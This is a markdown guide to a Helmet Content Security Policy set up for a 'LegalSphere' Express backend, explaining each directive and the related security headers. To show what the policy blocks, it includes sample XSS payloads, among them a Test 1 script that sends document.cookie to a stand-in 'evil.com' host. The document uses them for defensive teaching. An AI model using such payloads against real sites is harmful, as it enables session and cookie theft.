# 🛡️ Content Security Policy (CSP) Implementation

## Overview
Content Security Policy (CSP) has been implemented to prevent Cross-Site Scripting (XSS) attacks and other code injection attacks by controlling which resources can be loaded and executed.

## What is CSP?
Content Security Policy is an added layer of security that helps detect and mitigate certain types of attacks, including:
- **Cross-Site Scripting (XSS)**
- **Data injection attacks**
- **Clickjacking**
- **Malicious script execution**

## Implementation in server.js

### CSP Configuration
```javascript
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],           // Only allow resources from same origin
      scriptSrc: ["'self'"],             // Only allow scripts from same origin
      objectSrc: ["'none'"],             // Block all <object>, <embed>, <applet>
      upgradeInsecureRequests: []        // Automatically upgrade HTTP to HTTPS
    }
  })
);
```

## CSP Directives Explained

### 1. `defaultSrc: ["'self'"]`
**Purpose:** Sets the default policy for fetching resources

**What it does:**
- Only allows resources (images, fonts, scripts, etc.) from the same origin
- Blocks resources from external domains by default
- Acts as a fallback for other directives not explicitly set

**Example:**
```
✅ Allowed: https://yourdomain.com/style.css
❌ Blocked: https://malicious-site.com/evil.css
```

### 2. `scriptSrc: ["'self'"]`
**Purpose:** Controls which scripts can be executed

**What it does:**
- Only allows JavaScript from the same origin
- **Blocks inline scripts** (prevents XSS attacks)
- **Blocks external scripts** from untrusted sources
- Prevents `eval()` and similar dangerous functions

**Example:**
```html
✅ Allowed: <script src="/js/app.js"></script>
❌ Blocked: <script>alert('XSS')</script>
❌ Blocked: <script src="https://evil.com/malware.js"></script>
```

### 3. `objectSrc: ["'none'"]`
**Purpose:** Controls `<object>`, `<embed>`, and `<applet>` elements

**What it does:**
- Completely blocks all plugin content
- Prevents Flash, Java applets, and other embedded objects
- Mitigates plugin-based vulnerabilities

**Example:**
```html
❌ Blocked: <object data="malicious.swf"></object>
❌ Blocked: <embed src="evil.pdf"></embed>
❌ Blocked: <applet code="Malware.class"></applet>
```

### 4. `upgradeInsecureRequests: []`
**Purpose:** Automatically upgrades HTTP requests to HTTPS

**What it does:**
- Treats all HTTP URLs as HTTPS
- Prevents mixed content warnings
- Ensures all resources are loaded securely
- No value needed (empty array activates it)

**Example:**
```
Original: http://yourdomain.com/image.jpg
Upgraded: https://yourdomain.com/image.jpg
```

## Security Benefits

### 🛡️ Prevents XSS Attacks
**How:**
- Blocks inline scripts like `<script>alert('XSS')</script>`
- Prevents execution of scripts from untrusted sources
- Stops attackers from injecting malicious code

**Example Attack Blocked:**
```html
<!-- Attacker tries to inject: -->
<img src=x onerror="alert('XSS')">

<!-- CSP blocks the inline event handler -->
❌ BLOCKED: Inline event handlers not allowed
```

### 🚫 Blocks External Malicious Scripts
**How:**
- Only scripts from your domain can execute
- External CDNs and third-party scripts are blocked (unless explicitly allowed)
- Prevents loading of malware from compromised sites

**Example Attack Blocked:**
```html
<!-- Attacker tries to load: -->
<script src="https://evil-cdn.com/cryptominer.js"></script>

<!-- CSP blocks it -->
❌ BLOCKED: External script source not allowed
```

### 🔒 Prevents Plugin Exploits
**How:**
- Blocks all `<object>`, `<embed>`, and `<applet>` tags
- Eliminates Flash and Java plugin vulnerabilities
- Reduces attack surface

### 🔐 Enforces HTTPS
**How:**
- Automatically upgrades all HTTP requests to HTTPS
- Prevents man-in-the-middle attacks
- Ensures encrypted communication

## HTTP Response Headers

When CSP is active, the server sends this header with every response:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; upgrade-insecure-requests
```

## Testing CSP Protection

### Test 1: Inline Script Injection
**Attack Attempt:**
```html
<script>
  // Malicious code
  document.cookie = "stolen";
  window.location = "https://evil.com?data=" + document.cookie;
</script>
```

**Result:** ❌ **BLOCKED** - CSP prevents inline script execution

**Browser Console Error:**
```
Refused to execute inline script because it violates the following 
Content Security Policy directive: "script-src 'self'"
```

### Test 2: External Malicious Script
**Attack Attempt:**
```html
<script src="https://malicious-cdn.com/keylogger.js"></script>
```

**Result:** ❌ **BLOCKED** - CSP only allows scripts from same origin

**Browser Console Error:**
```
Refused to load the script 'https://malicious-cdn.com/keylogger.js' 
because it violates the following Content Security Policy directive: 
"script-src 'self'"
```

### Test 3: Event Handler Injection
**Attack Attempt:**
```html
<img src="x" onerror="alert('XSS')">
<button onclick="maliciousFunction()">Click</button>
```

**Result:** ❌ **BLOCKED** - Inline event handlers are not allowed

### Test 4: Object/Embed Injection
**Attack Attempt:**
```html
<object data="malicious.swf"></object>
<embed src="exploit.pdf"></embed>
```

**Result:** ❌ **BLOCKED** - All object/embed elements are blocked

## CSP Violation Reporting

When CSP blocks something, it logs to the browser console:

```
[Report Only] Refused to execute inline script because it violates 
the following Content Security Policy directive: "script-src 'self'"
```

## Compatibility with Your Application

### ✅ What Works
- Scripts loaded from your server (`/js/app.js`)
- Stylesheets from your domain
- Images from your domain
- API calls to your backend
- Static files from `/uploads` directory

### ⚠️ What Requires Adjustment
If you need to use external resources, you'll need to add them to the CSP:

**Example: Allow Google Fonts**
```javascript
directives: {
  defaultSrc: ["'self'"],
  scriptSrc: ["'self'"],
  styleSrc: ["'self'", "https://fonts.googleapis.com"],
  fontSrc: ["'self'", "https://fonts.gstatic.com"],
  objectSrc: ["'none'"],
  upgradeInsecureRequests: []
}
```

**Example: Allow CDN Scripts**
```javascript
directives: {
  defaultSrc: ["'self'"],
  scriptSrc: ["'self'", "https://cdn.jsdelivr.net"],
  objectSrc: ["'none'"],
  upgradeInsecureRequests: []
}
```

## Additional Security Headers

Along with CSP, Helmet also sets these security headers:

| Header | Purpose |
|--------|---------|
| `X-Frame-Options: SAMEORIGIN` | Prevents clickjacking |
| `X-Content-Type-Options: nosniff` | Prevents MIME-type sniffing |
| `Strict-Transport-Security` | Enforces HTTPS |
| `X-XSS-Protection: 0` | Disables legacy XSS filter (CSP is better) |

## Best Practices

### ✅ DO:
- Keep CSP as strict as possible
- Only allow trusted sources
- Test thoroughly after implementing CSP
- Monitor CSP violation reports
- Use HTTPS everywhere

### ❌ DON'T:
- Use `'unsafe-inline'` (defeats the purpose)
- Use `'unsafe-eval'` (allows dangerous code execution)
- Allow `*` (wildcard) sources
- Disable CSP in production

## Monitoring and Debugging

### Browser Developer Tools
1. Open DevTools (F12)
2. Go to Console tab
3. Look for CSP violation messages
4. Adjust CSP directives as needed

### Common CSP Errors
```
❌ "Refused to execute inline script"
   → Remove inline scripts, use external .js files

❌ "Refused to load script from 'https://...'"
   → Add the domain to scriptSrc directive

❌ "Refused to apply inline style"
   → Add styleSrc directive or use external CSS
```

## Migration Guide

If you have existing inline scripts or external resources:

1. **Identify all inline scripts** - Move them to external .js files
2. **List external resources** - CDNs, fonts, analytics, etc.
3. **Update CSP directives** - Add trusted sources
4. **Test thoroughly** - Check all functionality works
5. **Monitor violations** - Fix any remaining issues

## Summary

Your LegalSphere backend now has **Content Security Policy** protection:

✅ **Prevents XSS attacks** - Blocks inline scripts and untrusted sources
✅ **Blocks malicious scripts** - Only your domain's scripts can execute
✅ **Prevents plugin exploits** - All object/embed elements blocked
✅ **Enforces HTTPS** - Automatic upgrade of insecure requests
✅ **Defense in depth** - Works alongside other security measures

**CSP is active and protecting your application!** 🛡️

## References

- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Helmet.js Documentation](https://helmetjs.github.io/)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
